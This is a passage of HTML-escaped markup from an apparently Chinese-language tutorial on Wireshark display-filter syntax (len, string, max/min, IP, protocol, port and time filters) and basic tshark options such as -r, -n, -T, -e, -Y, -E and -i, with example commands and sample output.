&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;len&lt;span style=&#34;color:#56b6c2&#34;&gt;(&lt;/span&gt;http.host&lt;span style=&#34;color:#56b6c2&#34;&gt;)&lt;/span&gt; &amp;gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#d19a66&#34;&gt;20&lt;/span&gt;    //过滤HTTP主机名大于等于20字节的报文
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;string&#34;&gt;string()
&lt;/h3&gt;&lt;p&gt;当字段为非字符串类型，而又想转换为字符串字段再进行正则匹配时，很方便&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;string&lt;span style=&#34;color:#56b6c2&#34;&gt;(&lt;/span&gt;ip.addr&lt;span style=&#34;color:#56b6c2&#34;&gt;)&lt;/span&gt; ~ &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;^10|^11&amp;#34;&lt;/span&gt;    //过滤IP为10网段开头或者23网段开头的IP
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;string&lt;span style=&#34;color:#56b6c2&#34;&gt;(&lt;/span&gt;ip.dst&lt;span style=&#34;color:#56b6c2&#34;&gt;)&lt;/span&gt; matches r&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;^172\.(1[6-9]|2[0-9]|3[0-1])\.[0-9]{1,3}\.255&amp;#34;&lt;/span&gt;   //匹配目的IP中以255结尾的IP地址&lt;span style=&#34;color:#56b6c2&#34;&gt;(&lt;/span&gt;172.16到172.31&lt;span style=&#34;color:#56b6c2&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;maxmin&#34;&gt;max()、min()
&lt;/h3&gt;&lt;p&gt;max()和min()接受相同类型的任意数量的参数，并分别返回集合中最大/最小的参数&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;max&lt;span style=&#34;color:#56b6c2&#34;&gt;(&lt;/span&gt;tcp.srcport,tcp.dstport&lt;span style=&#34;color:#56b6c2&#34;&gt;)&lt;/span&gt; &amp;lt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#d19a66&#34;&gt;1024&lt;/span&gt;   //过滤tcp源端口、目的端口，最大不能超过1024的报文
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;min&lt;span style=&#34;color:#56b6c2&#34;&gt;(&lt;/span&gt;tcp.srcport+tcp.dstport&lt;span style=&#34;color:#56b6c2&#34;&gt;)&lt;/span&gt; &amp;gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#d19a66&#34;&gt;1024&lt;/span&gt;   //过滤tcp源端口+目的端口大于等于1024的报文
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;过滤ip&#34;&gt;过滤IP
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;1）源地址为192.168.0.1的包&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;ip.src == 192.168.0.1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;2）目的地址为192.168.0.1的包&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;ip.dst == 192.168.0.1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;3）源地址或目的地址是192.168.0.1的包&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;ip.addr == 192.168.0.1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;要原地址和目标地址一样就用===&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;4）排除上述包&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;!(表达式)
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;过滤协议&#34;&gt;过滤协议
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;1）仅捕获某种协议的包&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;直接写协议名即可，如http（区分大小写）&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2）捕获多种协议的包&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;使用逻辑或&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;http or telent
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;3）排除某种协议的包&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;使用逻辑非&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;not http
! http
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;过滤端口需要指明协议&#34;&gt;过滤端口（需要指明协议）
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;1）捕获某一端口的包&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;tcp.port == 80
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;2）捕获多端口的包&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;可以用and来表示多端口并列&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;tcp.port == 80 and 8080
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;也可以用比较运算符&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;udp.port &amp;gt;= 2048
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;过滤长度内容&#34;&gt;过滤长度、内容
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;1）长度（数据段的长度）&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;udp.length &amp;gt;= 30                        //udp的payload长度

http.content_length &amp;lt;= 20          //http消息体长度
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;2）数据包内容&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;使用matches/contains&lt;/p&gt;
&lt;h2 id=&#34;过滤时间&#34;&gt;过滤时间
&lt;/h2&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;frame.time &amp;gt;= &amp;#34;Apr 16, 2021 06:00:00.0&amp;#34; &amp;amp;&amp;amp; frame.time &amp;lt;= &amp;#34;Apr 16, 2021 06:59:00.0&amp;#34;

frame.time &amp;gt; &amp;#34;2024-04-11 11:00:00&amp;#34; and frame.time &amp;lt; &amp;#34;2024-04-11 11:01:00&amp;#34;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;注意：时间是字符串，要用双引号括起来&lt;/strong&gt;&lt;/p&gt;
&lt;h1 id=&#34;tshark基本命令&#34;&gt;tshark基本命令
&lt;/h1&gt;&lt;h2 id=&#34;-r--从一个已有的捕获文件读取数据包进行分析&#34;&gt;&lt;span style=&#34;color:red&#34;&gt;-r&lt;/span&gt; &amp;ndash; 从一个已有的捕获文件读取数据包进行分析
&lt;/h2&gt;&lt;p&gt;**&lt;code&gt;-r 111.pcap&lt;/code&gt;：**从名为 &lt;code&gt;111.pcap&lt;/code&gt; 的文件中读取数据包并简略打印出来&lt;/p&gt;
&lt;p&gt;&lt;span style=&#34;font-size:30px;color:#FF8800&#34;&gt;&lt;strong&gt;eg:&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1.837951      192.168.1.12 -&amp;gt;192.168.1.5        TCP              72                 8080   -&amp;gt;  45940          [FIN, ACK] Seq=1 ...
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;​      &lt;strong&gt;时间戳            原IP           目标IP          协议     数据包长度      源端口    目标端口       报文标头信息&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&#34;-n-n--禁止反向解析&#34;&gt;&lt;span style=&#34;color:red&#34;&gt;-n/-N&lt;/span&gt; &amp;ndash; 禁止反向解析
&lt;/h2&gt;&lt;h3 id=&#34;-n--禁用域名解析不对-ip-地址和端口号进行名称解析&#34;&gt;&lt;span style=&#34;color:aqua&#34;&gt;-n&lt;/span&gt; &amp;ndash; 禁用域名解析，不对 IP 地址和端口号进行名称解析
&lt;/h3&gt;&lt;p&gt;默认情况下，&lt;code&gt;tshark&lt;/code&gt; 会尝试将捕获到的 IP 地址解析为主机名（192.168.1.1-&amp;gt;exaple.com），同时也会将端口号转换为服务名称（如 80 变成 &lt;code&gt;http&lt;/code&gt;，443 变成 &lt;code&gt;https&lt;/code&gt; 等）&lt;/p&gt;
&lt;p&gt;通过使用 &lt;code&gt;-n&lt;/code&gt; 参数，可以避免这些解析，直接显示原始的 IP 地址和端口号&lt;/p&gt;
&lt;p&gt;&lt;span style=&#34;font-size:30px;color:#FF8800&#34;&gt;&lt;strong&gt;eg:&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tshark -r file.pcap   //直接输出
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;192.168.1.1 -&amp;gt; example.com &lt;span style=&#34;color:#d19a66&#34;&gt;80&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tshark -n -r file.pcap  //-n输出
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;192.168.1.1 -&amp;gt; 93.184.216.34 &lt;span style=&#34;color:#d19a66&#34;&gt;80&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;-n--精准控制解析哪些层级&#34;&gt;&lt;span style=&#34;color:aqua&#34;&gt;-N&lt;/span&gt; &amp;ndash; 精准控制解析哪些层级
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;格式：-N &amp;lt;反向解析flag1&amp;gt; -N &amp;lt;反向解析flag2&amp;gt;&amp;hellip;&lt;/strong&gt;&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th style=&#34;text-align: center&#34;&gt;flag取值&lt;/th&gt;
          &lt;th&gt;含义&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;d&lt;/td&gt;
          &lt;td&gt;对于DNS包启用解析&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;m&lt;/td&gt;
          &lt;td&gt;启用MAC地址解析&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;n&lt;/td&gt;
          &lt;td&gt;启用网络地址解析&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;N&lt;/td&gt;
          &lt;td&gt;使用外部解析器（例如DNS）进行网络地址解析，n需要被同时启用才有效果&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;t&lt;/td&gt;
          &lt;td&gt;启用传输层端口解析&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;v&lt;/td&gt;
          &lt;td&gt;启用VLAN ID的名称解析&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;&lt;span style=&#34;font-size:30px;color:#FF8800&#34;&gt;&lt;strong&gt;eg：&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tshark -r file.pcap   //直接输出
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1.837951 192.168.1.12 -&amp;gt; 192.168.1.5 TCP &lt;span style=&#34;color:#d19a66&#34;&gt;72&lt;/span&gt; &lt;span style=&#34;color:#d19a66&#34;&gt;45940&lt;/span&gt; -&amp;gt; &lt;span style=&#34;color:#d19a66&#34;&gt;80&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;[&lt;/span&gt;FIN, ACK&lt;span style=&#34;color:#56b6c2&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Seq&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Ack&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;2&lt;/span&gt; ...
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tshark -N t -r file.pcap  //-N t&lt;span style=&#34;color:#56b6c2&#34;&gt;(&lt;/span&gt;解析传输层端口&lt;span style=&#34;color:#56b6c2&#34;&gt;)&lt;/span&gt;输出
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1.837951 192.168.1.12 -&amp;gt; 192.168.1.5 TCP &lt;span style=&#34;color:#d19a66&#34;&gt;72&lt;/span&gt; &lt;span style=&#34;color:#d19a66&#34;&gt;45940&lt;/span&gt; -&amp;gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;(&lt;/span&gt;http&lt;span style=&#34;color:#56b6c2&#34;&gt;)&lt;/span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;80&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;[&lt;/span&gt;FIN, ACK&lt;span style=&#34;color:#56b6c2&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Seq&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Ack&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;2&lt;/span&gt; ...
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                                                                                            ↑
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;-t--指定输出格式&#34;&gt;&lt;span style=&#34;color:red&#34;&gt;-T&lt;/span&gt; &amp;ndash; 指定输出格式
&lt;/h2&gt;&lt;p&gt;**&lt;code&gt;-T fields&lt;/code&gt;：**仅输出指定的字段（需配合 -e 使用）&lt;/p&gt;
&lt;p&gt;**&lt;code&gt;-T text&lt;/code&gt;：**以普通文本格式输出（默认）&lt;/p&gt;
&lt;p&gt;**&lt;code&gt;-T json&lt;/code&gt;：**以 JSON 格式输出&lt;/p&gt;
&lt;p&gt;**&lt;code&gt;-T jsonraw&lt;/code&gt;：**以 JSON（包含原始数据）格式输出&lt;/p&gt;
&lt;p&gt;**&lt;code&gt;-T ek&lt;/code&gt;：**以 ElasticSearch 格式输出&lt;/p&gt;
&lt;h2 id=&#34;-e--指定显示数据包中的特定字段&#34;&gt;&lt;span style=&#34;color:red&#34;&gt;-e&lt;/span&gt; &amp;ndash; 指定显示数据包中的特定字段
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;格式：-e &amp;ldquo;字段1&amp;rdquo; -e &amp;ldquo;字段2&amp;rdquo;&amp;hellip;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;**&lt;code&gt;ip.src&lt;/code&gt;：**显示源 IP 地址&lt;/p&gt;
&lt;p&gt;**&lt;code&gt;ip.dst&lt;/code&gt;：**显示目标 IP 地址&lt;/p&gt;
&lt;p&gt;**&lt;code&gt;http.host&lt;/code&gt;：**显示 HTTP 请求中的主机名&lt;/p&gt;
&lt;p&gt;**&lt;code&gt;http.request.uri&lt;/code&gt;：**显示 HTTP 请求中的 URI（即请求的 URL 路径）&lt;/p&gt;
&lt;p&gt;**&lt;code&gt;usbhid.data&lt;/code&gt;：**只提取USB HID 设备数据&lt;/p&gt;
&lt;p&gt;**&lt;code&gt;frame.number&lt;/code&gt;：**显示数据包的报文帧数&lt;/p&gt;
&lt;p&gt;**&lt;code&gt;frame.time&lt;/code&gt;：**显示数据包捕获的时间戳&lt;/p&gt;
&lt;p&gt;**&lt;code&gt;frame.len&lt;/code&gt;：**显示数据包的长度&lt;/p&gt;
&lt;p&gt;&lt;span style=&#34;font-size:30px;color:#FF8800&#34;&gt;&lt;strong&gt;eg:&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tshark -n -r file.pcap -e &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;frame.number&amp;#34;&lt;/span&gt; -e &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;ip.addr&amp;#34;&lt;/span&gt; -e &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;tcp.port&amp;#34;&lt;/span&gt; -e tcp -T fields
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;//输出报文帧数、ip地址、端口、tcp协议的字段
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#d19a66&#34;&gt;1&lt;/span&gt;                  192.168.1.12,192.168.1.8                    37546,80                Transmission Control Protocol,SrcPort: ... 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;报文帧数                        ip地址                                        端口                                   tcp协议的字段
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;-y--筛选过滤报文&#34;&gt;&lt;span style=&#34;color:red&#34;&gt;-Y&lt;/span&gt; &amp;ndash; 筛选过滤报文
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;格式：-Y &amp;ldquo;过滤条件&amp;rdquo;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;用来过滤分析符合过滤表达式的报文，相当于wireshark最上面的过滤筛选栏功能&lt;/p&gt;
&lt;p&gt;&lt;span style=&#34;font-size:30px;color:#FF8800&#34;&gt;&lt;strong&gt;eg:&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tshark -n -r &amp;lt;filename&amp;gt; -Y &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;http.host == &amp;#34;&lt;/span&gt;web-server1&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;  //通过http.host过滤
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tshark -n -r http-keep-alive.pcap -Y &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;tcp.flags.syn==1&amp;amp;&amp;amp;tcp.flags.ack==0&amp;#34;&lt;/span&gt;  //过滤第一次握手的请求
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;-e--设置输出的控制字段&#34;&gt;&lt;span style=&#34;color:red&#34;&gt;-E&lt;/span&gt; &amp;ndash; 设置输出的控制字段
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;通过&lt;code&gt;-T&lt;/code&gt;参数来输出特定格式时，可以配合&lt;code&gt;-E&lt;/code&gt;参数来设置一些选项&lt;/strong&gt;&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;参数选项&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;默认&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;含义&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;bom=y|n&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;n&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;在输出前加上UTF-8字节顺序标记（十六进制ef、bb、bf）&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;header=y|n&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;n&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;打印一个使用-e作为输出第一行的字段名称头部&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;separator=/t|/s|&amp;lt;character&amp;gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;/t&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;设置字段分隔符，默认为/t，可以指定/s，即单个空格，或者自定义的其它字符&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;occurrence=f|l|a&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;a&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;打印每个字段的第一次(f)/最后一次(l)/或所有出现的内容(a)&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;aggregator=,|/s|&amp;lt;character&amp;gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;,&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;设置用于每个字段内的分割字符&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;quote=d|s|n&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;n&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;设置用于环绕字段的引号字符&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;n是null，无设置&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;span style=&#34;font-size:30px;color:#FF8800&#34;&gt;&lt;strong&gt;eg:&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tshark -n -r file.pcap  -E &lt;span style=&#34;color:#e06c75&#34;&gt;header&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;y -E &lt;span style=&#34;color:#e06c75&#34;&gt;occurrence&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;l -Y &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;icmp.seq==21&amp;#39;&lt;/span&gt; -e &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;icmp.seq&amp;#39;&lt;/span&gt; ...  -T fields |column -t
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;//    -E &lt;span style=&#34;color:#e06c75&#34;&gt;occurrence&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;l：包通过IPIP封装，occurrence&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;l指定输出外层IP
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;//    -Y &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;icmp.seq==21&amp;#39;&lt;/span&gt;：指定icmp.seq等于21的ICMP包
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;//    | column -t：将输出通过管道传输给 column 命令，使结果以表格的形式对齐
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;icmp.seq                          ip.src                            ip.dst                                ip     
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;21&lt;/span&gt;                                    114.132.116.32            113.145.123.23                 Internet Protocol Version 4，Src:，Dst:
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;-2--二次依赖分析&#34;&gt;&lt;span style=&#34;color:red&#34;&gt;-2&lt;/span&gt; &amp;ndash; 二次依赖分析
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;&lt;mark&gt;没有2以外的参数&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;tshark会根据上下文报文的依赖关系（tshark称之为&lt;strong&gt;two-pass&lt;/strong&gt;，即进行两次分析），来显示相关报文关联信息，如：&lt;code&gt;response in frame #&lt;/code&gt;、&lt;code&gt;reply in frame&lt;/code&gt;、&lt;code&gt;TCP Port numbers reused&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;-i--指定要捕获数据的网络接口&#34;&gt;&lt;span style=&#34;color:red&#34;&gt;-i&lt;/span&gt; &amp;ndash; 指定要捕获数据的网络接口
&lt;/h2&gt;&lt;p&gt;**&lt;code&gt;-i eth0&lt;/code&gt;：**表示从 &lt;code&gt;eth0&lt;/code&gt; 网络接口捕获数据包&lt;/p&gt;
&lt;p&gt;**&lt;code&gt;-i wlan0&lt;/code&gt;：**表示从无线网卡 &lt;code&gt;wlan0&lt;/code&gt; 捕获数据包&lt;/p&gt;
&lt;p&gt;**&lt;code&gt;-i any&lt;/code&gt;：**表示捕获所有接口的流量&lt;/p&gt;
&lt;p&gt;**&lt;code&gt;-&lt;/code&gt;：**表示从标准输入（stdin）捕获数据流&lt;/p&gt;
&lt;h2 id=&#34;-f--应用捕获过滤器只捕获特定的流量&#34;&gt;&lt;span style=&#34;color:red&#34;&gt;-f&lt;/span&gt; &amp;ndash; 应用捕获过滤器，只捕获特定的流量
